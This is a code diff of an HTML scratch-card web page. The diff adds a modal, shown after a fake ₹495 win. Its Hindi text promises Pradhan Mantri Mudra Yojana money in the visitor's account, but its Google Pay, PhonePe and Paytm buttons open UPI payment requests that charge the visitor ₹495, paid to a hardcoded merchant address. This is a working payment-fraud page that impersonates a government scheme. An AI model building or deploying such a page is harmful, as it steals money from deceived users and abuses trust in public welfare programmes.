@@ -6,17 +6,15 @@
   <title>Scratch Card</title>
   <style>
     body {
-      background: #fff;
       margin: 0;
-      padding: 0;
       font-family: sans-serif;
+      background: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
     }
 
-    .top-img,
-    .bottom-img {
+    .top-img, .bottom-img {
       width: 100%;
       max-width: 360px;
       margin: 10px auto;
@@ -37,8 +35,10 @@
     .reward-layer {
       position: absolute;
       z-index: 1;
-      width: 100%;
-      height: 100%;
+      width: 90%;
+      height: 90%;
+      top: 5%;
+      left: 5%;
       object-fit: cover;
       border-radius: 25px;
     }
@@ -86,45 +86,92 @@
       animation: blink 2s infinite;
     }
 
-    .hidden {
+    .hidden { display: none; }
+
+    /* Modal */
+    .modal {
+      position: fixed;
+      top: 60%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.6);
+      padding: 0;
+      z-index: 9999;
       display: none;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
     }
+
+    .modal.show {
+      display: flex;
+    }
+
+    .modal-box {
+      background: #fff;
+      padding: 20px 30px;
+      border-radius: 14px;
+      text-align: center;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+      max-width: 90%;
+    }
+
+    .modal-box h2 {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      color: #222;
+    }
+
+    .modal-box button {
+      margin: 6px;
+      padding: 10px 18px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      cursor: pointer;
+    }
+
+    .btn-gpay { background: #1e88e5; }
+    .btn-phonepe { background: #673ab7; }
+    .btn-paytm { background: #00bcd4; }
   </style>
 </head>
 <body>
 
-  <!-- 🔝 Top Banner -->
-  <img src="https://i.ibb.co/nNCT43nb/IMG-1114.jpg" alt="Top" class="top-img" />
+  <img src="https://i.ibb.co/nNCT43nb/IMG-1114.jpg" class="top-img" />
 
-  <!-- 🧧 Scratch Card -->
   <div class="card-container">
-    <!-- 🎁 Reward image -->
-    <img src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" alt="Reward" class="reward-layer hidden" id="rewardImage" />
-    <!-- 💸 ₹495 blinking -->
+    <img src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" class="reward-layer hidden" id="rewardImage" />
     <div class="reward-amount hidden" id="rewardAmount">₹495</div>
-    <!-- 🎨 Scratch layer -->
     <canvas id="scratchCanvas"></canvas>
-    <!-- 👆 Scratch instruction -->
     <div class="scratch-text" id="scratchText">Scratch here!</div>
   </div>
 
-  <!-- 🔻 Bottom Banner -->
-  <img src="https://i.ibb.co/0RrqgRTj/IMG-1120.jpg" alt="Bottom" class="bottom-img" />
-
-  <!-- 🔊 Win Sound -->
+  <img src="https://i.ibb.co/0RrqgRTj/IMG-1120.jpg" class="bottom-img" />
   <audio id="winSound" src="https://files.catbox.moe/0pc7om.mp3"></audio>
-
-  <!-- 🎉 Confetti Script -->
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+  <!-- Modal -->
+  <div id="upiModal" class="modal">
+    <div class="modal-box">
+      <h2>प्रधानमंत्री मुद्रा योजना के पैसे अपने खाते में ले</h2>
+      <button class="btn-gpay" onclick="pay('gpay')">Google Pay</button>
+      <button class="btn-phonepe" onclick="pay('phonepe')">PhonePe</button>
+      <button class="btn-paytm" onclick="pay('paytm')">Paytm</button>
+    </div>
+  </div>
 
   <script>
     const canvas = document.getElementById("scratchCanvas");
     const ctx = canvas.getContext("2d");
-    const scratchText = document.getElementById("scratchText");
+    const container = document.querySelector(".card-container");
     const rewardImage = document.getElementById("rewardImage");
     const rewardAmount = document.getElementById("rewardAmount");
-    const sound = document.getElementById("winSound");
-    const container = document.querySelector(".card-container");
+    const scratchText = document.getElementById("scratchText");
+    const winSound = document.getElementById("winSound");
+    const modal = document.getElementById("upiModal");
 
     canvas.width = container.offsetWidth;
     canvas.height = container.offsetHeight;
@@ -132,15 +179,12 @@
     const scratchLayer = new Image();
     scratchLayer.crossOrigin = "anonymous";
     scratchLayer.src = "https://i.ibb.co/nqr14xB9/IMG-1113.jpg";
-
     scratchLayer.onload = () => {
       ctx.globalCompositeOperation = "source-over";
       ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
     };
 
-    let isDrawing = false;
-    let lastX = 0, lastY = 0;
-    let revealed = false;
+    let isDrawing = false, revealed = false, lastX = 0, lastY = 0;
 
     function getPosition(e) {
       const rect = canvas.getBoundingClientRect();
@@ -154,11 +198,7 @@
       lastX = x;
       lastY = y;
       scratch(x, y, true);
-
-      // Ensure browser allows sound (first interaction)
-      try {
-        sound.play().catch(() => {});
-      } catch (e) {}
+      try { winSound.play().catch(() => {}); } catch (e) {}
     }
 
     function scratch(x, y, start = false) {
@@ -166,16 +206,13 @@
       ctx.lineCap = "round";
       ctx.lineJoin = "round";
       ctx.lineWidth = 40;
-
       ctx.beginPath();
-      if (start) {
-        ctx.moveTo(x, y);
-      } else {
+      if (start) ctx.moveTo(x, y);
+      else {
         ctx.moveTo(lastX, lastY);
         ctx.lineTo(x, y);
         ctx.stroke();
       }
-
       lastX = x;
       lastY = y;
     }
@@ -189,63 +226,47 @@
       return (cleared / (imgData.data.length / 4)) * 100;
     }
 
-    function showConfetti() {
-      confetti({
-        particleCount: 200,
-        spread: 70,
-        origin: { y: 0.6 }
-      });
-    }
-
     function checkReveal() {
-      if (revealed) return;
-
-      if (getScratchedPercent() >= 30) {
-        revealed = true;
-        canvas.classList.add("hidden");
-        scratchText.classList.add("hidden");
-        rewardImage.classList.remove("hidden");
-        rewardAmount.classList.remove("hidden");
-
-        try {
-          sound.play().catch(() => {});
-        } catch (e) {}
-
-        showConfetti();
-      }
+      if (revealed || getScratchedPercent() < 30) return;
+      revealed = true;
+      canvas.classList.add("hidden");
+      scratchText.classList.add("hidden");
+      rewardImage.classList.remove("hidden");
+      rewardAmount.classList.remove("hidden");
+      try { winSound.play().catch(() => {}); } catch (e) {}
+      confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
+      setTimeout(() => modal.classList.add("show"), 3000);
     }
 
-    // Mouse
-    canvas.addEventListener("mousedown", (e) => {
-      const { x, y } = getPosition(e);
-      startScratch(x, y);
-    });
-
-    canvas.addEventListener("mousemove", (e) => {
-      if (!isDrawing) return;
-      const { x, y } = getPosition(e);
-      scratch(x, y);
-      checkReveal();
-    });
-
+    canvas.addEventListener("mousedown", e => startScratch(...Object.values(getPosition(e))));
+    canvas.addEventListener("mousemove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); });
     canvas.addEventListener("mouseup", () => isDrawing = false);
     canvas.addEventListener("mouseleave", () => isDrawing = false);
 
-    // Touch
-    canvas.addEventListener("touchstart", (e) => {
-      const { x, y } = getPosition(e);
-      startScratch(x, y);
-    });
-
-    canvas.addEventListener("touchmove", (e) => {
-      if (!isDrawing) return;
-      const { x, y } = getPosition(e);
-      scratch(x, y);
-      checkReveal();
-      e.preventDefault();
-    });
-
+    canvas.addEventListener("touchstart", e => startScratch(...Object.values(getPosition(e))));
+    canvas.addEventListener("touchmove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); e.preventDefault(); });
     canvas.addEventListener("touchend", () => isDrawing = false);
+
+    function pay(app) {
+      const pa = "g1g4822917.rzp@icici";
+      const tr = "RZPQhptbTHPKvHtK8qrv2";
+      const pn = "G1G4";
+      const am = "495";
+      const tn = "ScratchWin";
+      const cu = "INR";
+      let uri = "";
+
+      if (app === "phonepe") {
+        uri = `phonepe://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
+      } else if (app === "gpay") {
+        uri = `gpay://upi/pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
+      } else {
+        uri = `paytmmp://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
+      }
+
+      window.location.href = uri;
+    }
   </script>
 </body>
 </html>
+
